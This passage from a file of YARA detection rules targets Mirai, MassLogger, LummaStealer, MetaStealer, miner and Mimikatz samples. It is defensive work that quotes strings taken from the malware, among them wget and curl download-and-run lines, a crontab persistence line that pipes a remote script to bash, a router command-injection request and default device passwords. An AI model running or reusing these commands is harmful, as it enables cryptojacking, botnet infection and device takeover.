      $x3 = "        curl -L -o  \"$HOME_1/systemdev/yes.tar.xz\" \"https://github.com/el3ctr0wqw1/xmrig-vrl2/releases/download/main/xmrig-vr" ascii /* score: '34.00'*/
      $s4 = "        wget -O \"$HOME_1/systemdev/yes.tar.xz\" \"https://github.com/el3ctr0wqw1/xmrig-vrl2/releases/download/main/xmrig-vrl\" " ascii /* score: '30.00'*/
      $s5 = "        if launch_program \"$executable\" -o hosts-to-ignore.ignorelist.com:1443 --tls ; then " fullword ascii /* score: '30.00'*/
      $s6 = "        curl -L -o  \"$HOME_1/systemdev/yes.tar.xz\" \"https://github.com/el3ctr0wqw1/xmrig-vrl2/releases/download/main/xmrig-vr" ascii /* score: '29.00'*/
      $s7 = "  # --- Step 2: Kill other 'bash' processes, excluding the current shell ---" fullword ascii /* score: '28.00'*/
      $s8 = "external_ip=$(wget -qO- ipv4.icanhazip.com 2>/dev/null || curl -s ipv4.icanhazip.com 2>/dev/null)" fullword ascii /* score: '27.00'*/
      $s9 = "    if ! crontab -l 2>/dev/null | grep -q \"wget -O - http://162.248.53.119:8000/mon.sh | bash\"; then" fullword ascii /* score: '24.00'*/
      $s10 = "        (crontab -l 2>/dev/null; echo \"*/30 * * * * wget -O - http://162.248.53.119:8000/mon.sh | bash\") | crontab -" fullword ascii /* score: '24.00'*/
      $s11 = "  # --- Step 1: Kill 'xmr' and 'node' processes ---" fullword ascii /* score: '23.00'*/
      $s12 = "        echo \"Warning: All startup attempts failed - continuing script anyway\"" fullword ascii /* score: '23.00'*/
      $s13 = "        wget -O \"$fallback_executable\" \"$download_url\" || return 1" fullword ascii /* score: '22.00'*/
      $s14 = "        curl -fL -o \"$fallback_executable\" \"$download_url\" || return 1" fullword ascii /* score: '21.00'*/
      $s15 = "  if command -v pgrep >/dev/null 2>&1; then" fullword ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule Mirai_signature__05960be7 {
   meta:
      description = "_subset_batch - file Mirai(signature)_05960be7.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "05960be79c3eb648827c514c35c99134cda8f4e280fa39f70a7b98f5af43739b"
   strings:
      $s1 = "/bin/busybox iptables -A INPUT -p tcp --dport 26721 -j ACCEPT" fullword ascii /* score: '18.00'*/
      $s2 = "/usr/bin/iptables -A INPUT -p tcp --dport 26721 -j ACCEPT" fullword ascii /* score: '18.00'*/
      $s3 = "busybox iptables -A INPUT -p tcp --dport 26721 -j ACCEPT" fullword ascii /* score: '15.00'*/
      $s4 = "/etc/config/hosts" fullword ascii /* score: '12.00'*/
      $s5 = "bindtoip" fullword ascii /* score: '11.00'*/
      $s6 = "#$%&'()*+,234567" fullword ascii /* score: '9.00'*/ /* hex encoded string '#Eg' */
      $s7 = "someoffdeeznuts" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 600KB and
      all of them
}

rule MassLogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__35cd26db {
   meta:
      description = "_subset_batch - file MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_35cd26db.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "35cd26db3de4420e0442ef5cf452e7f52519f98f3d3f7d168fb235bda1d8548b"
   strings:
      $s1 = "Jvgo.exe" fullword wide /* score: '22.00'*/
      $s2 = "Jvgo.pdb" fullword ascii /* score: '14.00'*/
      $s3 = "products.txt" fullword wide /* score: '14.00'*/
      $s4 = "listings.txt" fullword wide /* score: '14.00'*/
      $s5 = "results.txt" fullword wide /* score: '14.00'*/
      $s6 = "rotavitcA.metsyS" fullword wide /* reversed goodware string 'System.Activator' */ /* score: '13.00'*/
      $s7 = ".NET Framework 4.5*" fullword ascii /* score: '10.00'*/
      $s8 = "get_Listings" fullword ascii /* score: '9.00'*/
      $s9 = "get_DateAnnounced" fullword ascii /* score: '9.00'*/
      $s10 = "get_Currency" fullword ascii /* score: '9.00'*/
      $s11 = "get_Tokens" fullword ascii /* score: '9.00'*/
      $s12 = "racketa" fullword wide /* score: '8.00'*/
      $s13 = "listings" fullword wide /* score: '8.00'*/
      $s14 = "scoretext" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule MassLogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__e054c2fc {
   meta:
      description = "_subset_batch - file MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_e054c2fc.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e054c2fc74e0788e698df9e69fed9d8fe975df61fe699281508e4a097e43c8d2"
   strings:
      $s1 = "AgYW.exe" fullword wide /* score: '22.00'*/
      $s2 = "CommonDialog.Form1.resources" fullword ascii /* score: '15.00'*/
      $s3 = "BatchProcessing" fullword ascii /* score: '15.00'*/
      $s4 = "AgYW.pdb" fullword ascii /* score: '14.00'*/
      $s5 = "\\test.jpg" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule MassLogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__048dee7a {
   meta:
      description = "_subset_batch - file MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_048dee7a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "048dee7acb2d6fd7e7e24e4f3d3b825b8277c704c6c71fec66acaa3bff770cfb"
   strings:
      $s1 = "Eeww.exe" fullword wide /* score: '22.00'*/
      $s2 = "https://github.com/textmerger" fullword wide /* score: '17.00'*/
      $s3 = "Processor Count: {0}" fullword wide /* score: '17.00'*/
      $s4 = "TextProcessor" fullword ascii /* score: '15.00'*/
      $s5 = "textProcessor" fullword ascii /* score: '15.00'*/
      $s6 = "groupBoxProcessing" fullword wide /* score: '15.00'*/
      $s7 = "Text Processing Options" fullword wide /* score: '15.00'*/
      $s8 = ".NET Framework: 4.0.0.0" fullword wide /* score: '15.00'*/
      $s9 = "targetEncoding" fullword ascii /* score: '14.00'*/
      $s10 = "Eeww.pdb" fullword ascii /* score: '14.00'*/
      $s11 = "merged.txt" fullword wide /* score: '14.00'*/
      $s12 = "A Windows Forms application for merging multiple text files with customizable separators and processing options." fullword wide /* score: '11.00'*/
      $s13 = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*" fullword wide /* score: '11.00'*/
      $s14 = "Preview Merged Content" fullword wide /* score: '11.00'*/
      $s15 = ".NET Framework: {0}" fullword wide /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule MassLogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__0973bc15 {
   meta:
      description = "_subset_batch - file MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_0973bc15.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0973bc15da79ab1527648f46d39016824140c56a2b4204eac047bdeb10bb7960"
   strings:
      $s1 = "ssLq.exe" fullword wide /* score: '22.00'*/
      $s2 = "ssLq.pdb" fullword ascii /* score: '14.00'*/
      $s3 = "targetColumnName" fullword ascii /* score: '14.00'*/
      $s4 = "set_HasHeaders" fullword ascii /* score: '12.00'*/
      $s5 = "CSV Viewer - " fullword wide /* score: '12.00'*/
      $s6 = "GetSelectedRowCount" fullword ascii /* score: '9.00'*/
      $s7 = "AddColumnDialog" fullword ascii /* score: '9.00'*/
      $s8 = "csvContent" fullword ascii /* score: '9.00'*/
      $s9 = "GetSelectedRowIndices" fullword ascii /* score: '9.00'*/
      $s10 = "GetFormattedColumnNames" fullword ascii /* score: '9.00'*/
      $s11 = "GetColumnFormat" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule MetaStealer_signature_ {
   meta:
      description = "_subset_batch - file MetaStealer(signature).lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "29cc70f9303aa4a186d3024838cd0b4b68324739115b42fd49c2fdfc6b02d94a"
   strings:
      $x1 = "cmd.exe /c start msedge \"https://upsinf.com/pdf/address-validation-guidelines.pdf\" && curl -sLo \"%TEMP%\\v209up.pdf\" \"https" wide /* score: '75.00'*/
      $x2 = "C:\\Windows\\System32\\cmd.exe" fullword ascii /* score: '38.00'*/
      $s3 = "!..\\..\\..\\Windows\\System32\\cmd.exe" fullword wide /* score: '27.00'*/
      $s4 = "C:\\Windows\\System32" fullword wide /* score: '18.00'*/
      $s5 = "%ProgramFiles(x86)%\\Microsoft\\Edge\\Application\\msedge.exe" fullword wide /* score: '11.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 9KB and
      1 of ($x*) and all of them
}

rule MassLogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__5240a9ff {
   meta:
      description = "_subset_batch - file MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5240a9ff.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5240a9ff514c4c31fa548a21ef76f684efb7b62edb0b2db9cc5fbaa00e73b87b"
   strings:
      $s1 = "GoEa.exe" fullword wide /* score: '22.00'*/
      $s2 = "GoEa.pdb" fullword ascii /* score: '14.00'*/
      $s3 = "get_CompletedDate" fullword ascii /* score: '12.00'*/
      $s4 = "Please enter a task description." fullword wide /* score: '10.00'*/
      $s5 = "Please select a task and enter a description." fullword wide /* score: '10.00'*/
      $s6 = "get_CreatedDate" fullword ascii /* score: '9.00'*/
      $s7 = "get_ModifiedDate" fullword ascii /* score: '9.00'*/
      $s8 = "contentTextBox" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule MassLogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__bd3da5f9 {
   meta:
      description = "_subset_batch - file MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_bd3da5f9.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bd3da5f97d8b35c43ec96dedb259484caf1de63a4c1a2091963cb60444ea2c36"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADI" fullword ascii /* score: '27.00'*/
      $s2 = "djeA.exe" fullword wide /* score: '22.00'*/
      $s3 = "djeA.pdb" fullword ascii /* score: '14.00'*/
      $s4 = "get_ShowSystemFiles" fullword ascii /* score: '12.00'*/
      $s5 = "Directory Plus - Bookmarks" fullword wide /* score: '12.00'*/
      $s6 = "bookmarks.xml" fullword wide /* score: '10.00'*/
      $s7 = "Error exporting bookmarks: " fullword wide /* score: '10.00'*/
      $s8 = "Error importing bookmarks: " fullword wide /* score: '10.00'*/
      $s9 = "get_IsFavorite" fullword ascii /* score: '9.00'*/
      $s10 = "GetFilesAndFolders" fullword ascii /* score: '9.00'*/
      $s11 = "<GetFavoriteBookmarks>b__9_1" fullword ascii /* score: '9.00'*/
      $s12 = "get_MaxFilesToAnalyze" fullword ascii /* score: '9.00'*/
      $s13 = "get_EmptyFolders" fullword ascii /* score: '9.00'*/
      $s14 = "<GetFavoriteBookmarks>b__9_0" fullword ascii /* score: '9.00'*/
      $s15 = "GetDirectorySizes" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule Mirai_signature__03d3196b {
   meta:
      description = "_subset_batch - file Mirai(signature)_03d3196b.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "03d3196bd5ab295d218435d5daf1421476e4ab80dd1a496380f36e59cd38e99d"
   strings:
      $s1 = "/usr/libexec/openssh/sftp-server" fullword ascii /* score: '17.00'*/
      $s2 = "User-Agent: Update v1.0" fullword ascii /* score: '17.00'*/
      $s3 = "AWAVAUA" fullword ascii /* reversed goodware string 'AUAVAWA' */ /* score: '16.50'*/
      $s4 = "AWAVAUATA" fullword ascii /* reversed goodware string 'ATAUAVAWA' */ /* score: '16.50'*/
      $s5 = "/proc/%d/cmdline" fullword ascii /* score: '15.00'*/
      $s6 = "/etc/config/hosts" fullword ascii /* score: '12.00'*/
      $s7 = "dropbear" fullword ascii /* score: '10.00'*/
      $s8 = "condi2 %s:%d" fullword ascii /* score: '9.50'*/
      $s9 = "telnetd" fullword ascii /* score: '8.00'*/
      $s10 = "netstat" fullword ascii /* score: '8.00'*/
      $s11 = "webserv" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      8 of them
}

rule Mirai_signature__0d1e9700 {
   meta:
      description = "_subset_batch - file Mirai(signature)_0d1e9700.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0d1e9700c0d921ad7473eb60517c55e7d1b70e120f8bfac8961a48af5c9b0b5f"
   strings:
      $s1 = "/usr/libexec/openssh/sftp-server" fullword ascii /* score: '17.00'*/
      $s2 = "User-Agent: Update v1.0" fullword ascii /* score: '17.00'*/
      $s3 = "/proc/%d/cmdline" fullword ascii /* score: '15.00'*/
      $s4 = "u__get_myaddress: socket" fullword ascii /* score: '12.00'*/
      $s5 = "dropbear" fullword ascii /* score: '10.00'*/
      $s6 = "condi2 %s:%d" fullword ascii /* score: '9.50'*/
      $s7 = "ropbear" fullword ascii /* score: '8.00'*/
      $s8 = "telnetd" fullword ascii /* score: '8.00'*/
      $s9 = "netstat" fullword ascii /* score: '8.00'*/
      $s10 = "webserv" fullword ascii /* score: '8.00'*/
      $s11 = "busybox" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      8 of them
}

rule Mirai_signature__0aca4c11 {
   meta:
      description = "_subset_batch - file Mirai(signature)_0aca4c11.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0aca4c1140ee77179a0dce5e25c83473484b88243670e92c2bad2b8ec3c6522b"
   strings:
      $s1 = "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%%20http%%3A//%d.%d.%d.%d/router.tplink.sh%%20-O-%%7C" ascii /* score: '26.00'*/
      $s2 = "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%%20http%%3A//%d.%d.%d.%d/router.tplink.sh%%20-O-%%7C" ascii /* score: '26.00'*/
      $s3 = "No child process" fullword ascii /* score: '15.00'*/
      $s4 = "Host: %d.%d.%d.%d:80" fullword ascii /* score: '14.50'*/
      $s5 = "No file descriptors available" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__0b080039 {
   meta:
      description = "_subset_batch - file Mirai(signature)_0b080039.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0b08003980be345eaf6c0c0ddd594e7052dd1986573d259d093a964462503d16"
   strings:
      $s1 = "/proc/%s/cmdline" fullword ascii /* score: '15.00'*/
      $s2 = "No child process" fullword ascii /* score: '15.00'*/
      $s3 = "rootpasswd" fullword ascii /* score: '14.00'*/
      $s4 = "No file descriptors available" fullword ascii /* score: '10.00'*/
      $s5 = "miraisucks.lol" fullword ascii /* score: '10.00'*/
      $s6 = "mrrp.ink" fullword ascii /* score: '10.00'*/
      $s7 = "assword" fullword ascii /* score: '8.00'*/
      $s8 = "juantech" fullword ascii /* score: '8.00'*/
      $s9 = "dreambox" fullword ascii /* score: '8.00'*/
      $s10 = "xmhdipc" fullword ascii /* score: '8.00'*/
      $s11 = "realtek" fullword ascii /* score: '8.00'*/
      $s12 = "avocent" fullword ascii /* score: '8.00'*/
      $s13 = "root126" fullword ascii /* score: '8.00'*/
      $s14 = "cxlinux" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Mirai_signature__0b0eb370 {
   meta:
      description = "_subset_batch - file Mirai(signature)_0b0eb370.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0b0eb3705bc4cef923d383620faf8aa2831cf7f6b2b54d2ab503c8f5924169ce"
   strings:
      $s1 = "No child process" fullword ascii /* score: '15.00'*/
      $s2 = "No file descriptors available" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      all of them
}

rule Mirai_signature__0b7d39a7 {
   meta:
      description = "_subset_batch - file Mirai(signature)_0b7d39a7.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0b7d39a76b18a327e3b81a347d7235855b689f546bff4b4a26f9f1c763d80890"
   strings:
      $s1 = "No child process" fullword ascii /* score: '15.00'*/
      $s2 = "rootpasswd" fullword ascii /* score: '14.00'*/
      $s3 = "No file descriptors available" fullword ascii /* score: '10.00'*/
      $s4 = "mrrp.ink" fullword ascii /* score: '10.00'*/
      $s5 = "__vdso_clock_gettime" fullword ascii /* score: '9.00'*/
      $s6 = "__vdso_clock_gettime64" fullword ascii /* score: '9.00'*/
      $s7 = "juantech" fullword ascii /* score: '8.00'*/
      $s8 = "dreambox" fullword ascii /* score: '8.00'*/
      $s9 = "xmhdipc" fullword ascii /* score: '8.00'*/
      $s10 = "realtek" fullword ascii /* score: '8.00'*/
      $s11 = "avocent" fullword ascii /* score: '8.00'*/
      $s12 = "root126" fullword ascii /* score: '8.00'*/
      $s13 = "cxlinux" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Mirai_signature__0d697c7c {
   meta:
      description = "_subset_batch - file Mirai(signature)_0d697c7c.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0d697c7cd6a162e2fbb18df2db1073234aac1cb8401149b67561a11b44d9d7d7"
   strings:
      $s1 = "/proc/%d/cmdline" fullword ascii /* score: '15.00'*/
      $s2 = "No child process" fullword ascii /* score: '15.00'*/
      $s3 = "rootpasswd" fullword ascii /* score: '14.00'*/
      $s4 = "ftpget" fullword ascii /* score: '10.00'*/
      $s5 = "No file descriptors available" fullword ascii /* score: '10.00'*/
      $s6 = "mrrp.ink" fullword ascii /* score: '10.00'*/
      $s7 = "__vdso_clock_gettime" fullword ascii /* score: '9.00'*/
      $s8 = "telnetd" fullword ascii /* score: '8.00'*/
      $s9 = "juantech" fullword ascii /* score: '8.00'*/
      $s10 = "dreambox" fullword ascii /* score: '8.00'*/
      $s11 = "xmhdipc" fullword ascii /* score: '8.00'*/
      $s12 = "realtek" fullword ascii /* score: '8.00'*/
      $s13 = "avocent" fullword ascii /* score: '8.00'*/
      $s14 = "root126" fullword ascii /* score: '8.00'*/
      $s15 = "cxlinux" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule MassLogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__d78b1315 {
   meta:
      description = "_subset_batch - file MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d78b1315.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d78b1315a596c3424ed01722ea7d1370180affa97474a8a4fd55b1bb012c8411"
   strings:
      $s1 = "QtvJ.exe" fullword wide /* score: '22.00'*/
      $s2 = "Unit Converter - Conversion History Report" fullword wide /* score: '20.00'*/
      $s3 = "Conversion History - Unit Converter" fullword wide /* score: '17.00'*/
      $s4 = "GetUnitDescription" fullword ascii /* score: '15.00'*/
      $s5 = "QtvJ.pdb" fullword ascii /* score: '14.00'*/
      $s6 = "Unsupported file format. Use .csv or .txt" fullword wide /* score: '14.00'*/
      $s7 = "Settings - Unit Converter" fullword wide /* score: '14.00'*/
      $s8 = "ConversionHistory_{0:yyyyMMdd}.csv" fullword wide /* score: '13.00'*/
      $s9 = "<GetMostUsedConversions>b__20_1" fullword ascii /* score: '12.00'*/
      $s10 = "GetConversions" fullword ascii /* score: '12.00'*/
      $s11 = "GetMostUsedConversions" fullword ascii /* score: '12.00'*/
      $s12 = "<GetMostUsedConversions>b__20_0" fullword ascii /* score: '12.00'*/
      $s13 = "GetRecentConversions" fullword ascii /* score: '12.00'*/
      $s14 = "<GetMostUsedConversions>b__20_2" fullword ascii /* score: '12.00'*/
      $s15 = "Export Conversion History" fullword wide /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule LummaStealer_signature__37801b95c438a73e300d9190a7cb0752_imphash_ {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_37801b95c438a73e300d9190a7cb0752(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c62f5b95b87e1e31d8cc89d2d7e31968cad5eba9d26e362b35501081c4a5680a"
   strings:
      $s1 = "[shell32] Documents = %ls" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule LummaStealer_signature__37801b95c438a73e300d9190a7cb0752_imphash__02f7c016 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_37801b95c438a73e300d9190a7cb0752(imphash)_02f7c016.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "02f7c016d7ea160bc1f997a7d5a94505be26de9853bd44457d2adb99e08539e4"
   strings:
      $s1 = "[shell32] Documents = %ls" fullword wide /* score: '9.00'*/
      $s2 = ",)61=+)61" fullword ascii /* score: '9.00'*/ /* hex encoded string 'aa' */
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule LummaStealer_signature__37801b95c438a73e300d9190a7cb0752_imphash__2f9552fb {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_37801b95c438a73e300d9190a7cb0752(imphash)_2f9552fb.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2f9552fb6f1ff04da4df4799337be64da7f8dfe06035d528da32233bc7b50afe"
   strings:
      $s1 = "[shell32] Documents = %ls" fullword wide /* score: '9.00'*/
      $s2 = ",)61=+)61" fullword ascii /* score: '9.00'*/ /* hex encoded string 'aa' */
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule LummaStealer_signature__37801b95c438a73e300d9190a7cb0752_imphash__363b64c2 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_37801b95c438a73e300d9190a7cb0752(imphash)_363b64c2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "363b64c2112bb5876b55d4cf247f0437ffd3ca5aa1d0b7390a8e2873230d5dc8"
   strings:
      $s1 = "http://www.digicert.com/CPS0" fullword ascii /* score: '17.00'*/
      $s2 = "5http://cacerts.digicert.com/DigiCertTrustedRootG4.crt0C" fullword ascii /* score: '16.00'*/
      $s3 = "2http://crl3.digicert.com/DigiCertTrustedRootG4.crl0" fullword ascii /* score: '16.00'*/
      $s4 = "\"Entrust Timestamp Authority - TSA1" fullword ascii /* score: '15.00'*/
      $s5 = "\"Entrust Timestamp Authority - TSA10" fullword ascii /* score: '15.00'*/
      $s6 = "http://ocsp.digicert.com0\\" fullword ascii /* score: '14.00'*/
      $s7 = "Phttp://cacerts.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crt0" fullword ascii /* score: '13.00'*/
      $s8 = "Mhttp://crl3.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0S" fullword ascii /* score: '13.00'*/
      $s9 = "Mhttp://crl4.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0>" fullword ascii /* score: '13.00'*/
      $s10 = "'http://aia.entrust.net/ts1-chain256.cer01" fullword ascii /* score: '10.00'*/
      $s11 = "https://www.entrust.net/rpa0" fullword ascii /* score: '10.00'*/
      $s12 = "[shell32] Documents = %ls" fullword wide /* score: '9.00'*/
      $s13 = ",)61=+)61" fullword ascii /* score: '9.00'*/ /* hex encoded string 'aa' */
      $s14 = "* 1bfNU" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      8 of them
}

rule LummaStealer_signature__37801b95c438a73e300d9190a7cb0752_imphash__67e84e61 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_37801b95c438a73e300d9190a7cb0752(imphash)_67e84e61.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "67e84e61aa5fe1a0946ae1df43475602bbecb658a8de14a5e83978cbcbc6b2a6"
   strings:
      $s1 = "[shell32] Documents = %ls" fullword wide /* score: '9.00'*/
      $s2 = ",)61=+)61" fullword ascii /* score: '9.00'*/ /* hex encoded string 'aa' */
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule LummaStealer_signature__37801b95c438a73e300d9190a7cb0752_imphash__e88f1786 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_37801b95c438a73e300d9190a7cb0752(imphash)_e88f1786.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e88f1786355d176e13bca67f951e06ef6c3d342dad095492cb5b98dbc75a756f"
   strings:
      $s1 = "[shell32] Documents = %ls" fullword wide /* score: '9.00'*/
      $s2 = ",)61=+)61" fullword ascii /* score: '9.00'*/ /* hex encoded string 'aa' */
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule LummaStealer_signature__37801b95c438a73e300d9190a7cb0752_imphash__f6bcb9c8 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_37801b95c438a73e300d9190a7cb0752(imphash)_f6bcb9c8.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f6bcb9c86a45cccbfb318545d3e3688d0c37e74892dadcac6e40970bb8b83ff8"
   strings:
      $s1 = "UVWSPH" fullword ascii /* reversed goodware string 'HPSWVU' */ /* score: '13.50'*/
      $s2 = "[shell32] Documents = %ls" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule MassLogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__bd1c7fec {
   meta:
      description = "_subset_batch - file MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_bd1c7fec.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bd1c7fec482e5cae6c29f196953329ee39b3481542738f0b1395392fb9c3ee52"
   strings:
      $s1 = "LHyc.exe" fullword wide /* score: '22.00'*/
      $s2 = "LHyc.pdb" fullword ascii /* score: '14.00'*/
      $s3 = "Export Complete" fullword wide /* score: '12.00'*/
      $s4 = "Overall: {0:F2}% ({1}) - GPA: {2:F2}" fullword wide /* score: '12.00'*/
      $s5 = "Overall: 0.00% (F) - GPA: 0.00" fullword wide /* score: '12.00'*/
      $s6 = "{0}: {1:F1}% ({2} items) - Weight: {3:P0}" fullword wide /* score: '12.00'*/
      $s7 = "Text files (*.txt)|*.txt|All files (*.*)|*.*" fullword wide /* score: '11.00'*/
      $s8 = "Error exporting report: " fullword wide /* score: '10.00'*/
      $s9 = "get_AssignmentName" fullword ascii /* score: '9.00'*/
      $s10 = "PercentageToGPA" fullword ascii /* score: '9.00'*/
      $s11 = "PercentageToLetterGrade" fullword ascii /* score: '9.00'*/
      $s12 = "GetOverallLetterGrade" fullword ascii /* score: '9.00'*/
      $s13 = "GetWeightedPoints" fullword ascii /* score: '9.00'*/
      $s14 = "get_DateAssigned" fullword ascii /* score: '9.00'*/
      $s15 = "GetGradeStatus" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule MassLogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__819524e6 {
   meta:
      description = "_subset_batch - file MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_819524e6.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "819524e650df7f7050d41834f4a30b370e50d99add64ace080c2b57df5ba1997"
   strings:
      $s1 = "pdgq.exe" fullword wide /* score: '22.00'*/
      $s2 = "pdgq.pdb" fullword ascii /* score: '14.00'*/
      $s3 = "Export Complete" fullword wide /* score: '12.00'*/
      $s4 = "GenerateExportContent" fullword ascii /* score: '12.00'*/
      $s5 = "Text files (*.txt)|*.txt|All files (*.*)|*.*" fullword wide /* score: '11.00'*/
      $s6 = "Analogous" fullword wide /* score: '11.00'*/
      $s7 = "ColorSchemeGenerator.ExportForm.resources" fullword ascii /* score: '10.00'*/
      $s8 = "Error exporting file: " fullword wide /* score: '10.00'*/
      $s9 = "GetColorHex" fullword ascii /* score: '9.00'*/
      $s10 = "get_SchemeType" fullword ascii /* score: '9.00'*/
      $s11 = "GetFileFilter" fullword ascii /* score: '9.00'*/
      $s12 = "GenerateAnalogous" fullword ascii /* score: '9.00'*/
      $s13 = "{0} ({1}) - {2} colors" fullword wide /* score: '9.00'*/
      $s14 = "Export Color Scheme" fullword wide /* score: '9.00'*/
      $s15 = "Complementary" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule Mimikatz_signature_ {
   meta:
      description = "_subset_batch - file Mimikatz(signature).ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "09859ad6375f684bbfa364788c13fd3625511249bdc7ab292ad6533315a78f8b"
   strings:
